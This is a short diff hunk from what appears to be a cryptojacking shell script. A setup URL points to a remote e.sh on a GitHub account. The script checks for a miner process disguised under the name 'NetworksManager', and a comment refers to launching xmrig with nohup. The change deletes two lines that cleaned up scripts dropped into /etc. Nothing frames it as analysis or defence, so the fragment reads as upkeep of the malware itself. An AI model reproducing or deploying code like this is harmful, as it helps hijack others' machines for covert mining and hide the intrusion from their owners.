@@ -8,8 +8,6 @@ setupurl="https://github.com/uzidlrxvs/fos/raw/main/e.sh"
 if [[ $(ps -ef | grep NetworksManager | grep -v grep | wc -l) != 0 ]]; then
     # if not already runing, launch xmrig with nohup
     echo "running proccess"
-	rm -r /etc/e.sh
-	rm -r /etc/*.sh.*
     exit
 fi
 
